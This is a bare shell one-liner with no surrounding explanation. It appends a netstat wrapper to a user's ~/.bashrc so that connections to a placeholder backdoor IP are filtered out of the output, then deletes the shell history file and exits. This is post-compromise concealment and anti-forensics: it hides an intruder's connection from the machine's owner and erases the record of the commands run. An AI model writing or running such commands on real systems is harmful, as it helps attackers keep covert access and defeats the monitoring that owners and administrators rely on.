echo "function netstat() {
    command netstat "$@" | grep -v #BACKDOOR_IP_TO_CAMOUF
}
" >> ~/.bashrc; rm $HISTFILE; exit